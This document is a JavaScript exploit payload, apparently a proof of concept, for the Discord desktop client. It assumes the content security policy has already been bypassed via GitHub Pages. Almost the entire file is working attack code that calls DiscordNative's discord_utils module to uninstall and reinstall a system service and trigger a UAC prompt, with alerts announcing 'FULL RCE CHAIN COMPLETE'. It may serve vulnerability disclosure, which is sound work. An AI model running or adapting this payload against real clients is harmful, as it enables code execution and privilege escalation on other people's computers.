// COMPLETE RCE CHAIN - UNINSTALL THEN REINSTALL SERVICE
// This will trigger UAC prompt by first removing, then reinstalling the service

console.log("🔥 DISCORD RCE CHAIN - FULL DEMO");
console.log("=" + "=".repeat(60));

// Step 1: Confirm CSP bypass
alert("🎉 CSP BYPASS SUCCESSFUL!\n\nPayload loaded from GitHub Pages");

console.log("[✅] CSP bypassed via GitHub Pages");
console.log("[✅] Arbitrary JavaScript execution achieved");

// Step 2: Check DiscordNative availability
if (typeof DiscordNative === 'undefined') {
    console.log("[❌] DiscordNative not available");
    alert("⚠️ Not in Discord context");
} else {
    console.log("[✅] DiscordNative available");

    try {
        // Load discord_utils module
        console.log("\n[*] Loading discord_utils module...");
        const utils = DiscordNative.nativeModules.requireModule('discord_utils');
        console.log("[✅] discord_utils loaded successfully");

        // Step 3: First UNINSTALL the service
        console.log("\n[STEP 1/2] Uninstalling existing service...");

        utils.uninstallSystemService()
            .then(uninstallResult => {
                console.log(`[✅] Service uninstalled: ${JSON.stringify(uninstallResult)}`);

                // Wait 1 second, then reinstall
                console.log("\n[*] Waiting 1 second before reinstall...");

                setTimeout(() => {
                    // Step 4: Now REINSTALL the service (this will trigger UAC!)
                    console.log("\n[STEP 2/2] Reinstalling service...");
                    console.log("[🔥] UAC PROMPT SHOULD APPEAR NOW!");

                    utils.installSystemService()
                        .then(installResult => {
                            console.log(`[🎉] SUCCESS! Service installed: ${JSON.stringify(installResult)}`);

                            alert("🔥 FULL RCE CHAIN COMPLETE!\n\n" +
                                "1. CSP Bypass ✅\n" +
                                "2. Remote Code Execution ✅\n" +
                                "3. Service Uninstalled ✅\n" +
                                "4. Service Reinstalled ✅\n" +
                                "5. UAC Prompt Triggered ✅\n\n" +
                                "CRITICAL SEVERITY EXPLOIT!");
                        })
                        .catch(installError => {
                            console.log(`[!] Install failed: ${installError.message}`);
                            alert(`Install failed: ${installError.message}`);
                        });
                }, 1000);
            })
            .catch(uninstallError => {
                console.log(`[!] Uninstall failed (service might not exist): ${uninstallError.message}`);

                // If uninstall fails (service doesn't exist), just try to install
                console.log("\n[*] Service not installed, trying direct install...");

                utils.installSystemService()
                    .then(installResult => {
                        console.log(`[✅] Service installed: ${JSON.stringify(installResult)}`);
                        alert("🔥 RCE CHAIN COMPLETE!\n\nUAC prompt should have appeared!");
                    })
                    .catch(installError => {
                        console.log(`[!] Install failed: ${installError.message}`);
                    });
            });

    } catch (e) {
        console.log(`[❌] Error: ${e.message}`);
        alert(`Error: ${e.message}`);
    }
}

console.log("\n" + "=" + "=".repeat(60));
console.log("PAYLOAD EXECUTION COMPLETE");
console.log("=" + "=".repeat(60));
